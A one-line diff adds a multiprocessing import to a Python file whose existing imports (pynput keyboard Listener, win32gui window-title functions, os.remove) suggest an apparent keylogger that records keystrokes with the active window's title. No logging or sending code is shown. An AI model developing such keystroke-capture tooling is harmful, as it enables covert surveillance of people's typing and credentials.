@@ -1,3 +1,4 @@
+from multiprocessing import Queue # needed for compilation
 from pynput.keyboard import Key, Listener
 from win32gui import GetWindowText, GetForegroundWindow
 from os import remove
